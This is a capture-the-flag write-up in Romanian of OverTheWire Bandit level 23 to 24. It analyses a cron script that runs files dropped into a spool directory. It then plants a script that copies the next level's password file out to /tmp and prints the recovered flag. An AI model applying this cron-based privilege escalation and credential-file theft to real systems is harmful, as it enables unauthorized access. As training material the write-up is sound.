# Level 23 → Level 24

## Level Goal

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. 
Look in **/etc/cron.d/** for the configuration and see what command is being executed.

## Write-Up

Ne uitam in cron-ul de la nivelul urmator:
```bash
bandit23@bandit:~$ cd /etc/cron.d/

bandit23@bandit:/etc/cron.d$ ls -la
total 60
drwxr-xr-x   2 root root  4096 Jun 14 17:57 .
drwxr-xr-x 132 root root 12288 Jun 14 17:57 ..
-r--r-----   1 root root    47 Jun 14 17:54 behemoth4_cleanup
-rw-r--r--   1 root root   123 Jun 14 17:46 clean_tmp
-rw-r--r--   1 root root   120 Jun 14 17:54 cronjob_bandit22
-rw-r--r--   1 root root   122 Jun 14 17:54 cronjob_bandit23
-rw-r--r--   1 root root   120 Jun 14 17:54 cronjob_bandit24
-rw-r--r--   1 root root   201 Apr  8  2024 e2scrub_all
-r--r-----   1 root root    48 Jun 14 17:55 leviathan5_cleanup
-rw-------   1 root root   138 Jun 14 17:55 manpage3_resetpw_job
-rwx------   1 root root    52 Jun 14 17:57 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 31  2024 .placeholder
-rw-r--r--   1 root root   396 Jan  9  2024 sysstat

bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```
Avem un script care executa si sterge toate fisierele din `/var/spool/bandit24/foo` (`myname` este `bandit24` pentru ca este executat pe urmatorul nivel).

Sa verificam ce se afla acolo:
```bash
bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24/foo

bandit23@bandit:/var/spool/bandit24/foo$ ls -la
ls: cannot open directory '.': Permission denied
```
Din pacate nu putem vedea ce se afla in `/foo`. Ne intoarcem si verificam permisiunile:
```bash
bandit23@bandit:/var/spool/bandit24/foo$ cd ..

bandit23@bandit:/var/spool/bandit24$ ls -la
total 12
dr-xr-x--- 3 bandit24 bandit23 4096 Jun 14 17:54 .
drwxr-xr-x 5 root     root     4096 Jun 14 17:54 ..
drwxrwx-wx 2 root     bandit24 4096 Jun 24 08:35 foo
```
La public are write si execute, dar nu read. Deci putem lucra in el dar nu putem vedea ce e in el.

Vom scrie un **shell script** care sa fie executat din `/foo` si care sa ne scrie parola unde vrem.

Vom lucra intr-un director temporar, caruia ii dam toate permisiunile.
```bash
bandit23@bandit:/var/spool/bandit24$ cd /tmp

bandit23@bandit:/tmp$ mkdir scriptdir

bandit23@bandit:/tmp$ chmod 777 scriptdir

bandit23@bandit:/tmp$ cd scriptdir

bandit23@bandit:/tmp/scriptdir$ nano script.sh
```
Shell script-ul va arata astfel:
```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/scriptdir/password
```
Il facem executabil si il mutam in `/foo`:
```bash
bandit23@bandit:/tmp/scriptdir$ chmod +x script.sh

bandit23@bandit:/tmp/scriptdir$ mv script.sh /var/spool/bandit24/foo
```
Dupa ce asteptam un minut (cron-ul face actiunea intr-un minut), primim parola in `password`.
```bash
bandit23@bandit:/tmp/scriptdir$ ls
password

bandit23@bandit:/tmp/scriptdir$ cat password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```
Flag: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
